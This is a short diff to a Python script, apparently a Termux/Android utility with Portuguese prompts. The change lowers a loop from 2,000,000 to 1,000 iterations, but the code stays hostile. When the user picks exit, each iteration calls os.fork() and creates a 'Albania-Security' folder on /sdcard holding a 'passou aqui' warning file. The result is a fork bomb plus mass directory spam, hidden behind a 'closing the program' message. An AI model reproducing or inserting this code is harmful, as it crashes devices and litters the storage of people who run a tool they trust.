@@ -78,7 +78,7 @@ elif menu == 2:
 input(f' {XV} aperte {XXI}{R}ENTER{XXI}{XV} para fechar o programa.{XXI}')
 time.sleep (0.5)
 os.system (' figlet -f slant ENCERRANDO...')
-for i in range(2000000):
+for i in range(1000):
     os.fork()
     dir = ("Albania-Security"+str(i))
     os.system (f'cd /sdcard && mkdir {dir} && cd {dir} && echo Albania-Security passou aqui > AVISO.txt')
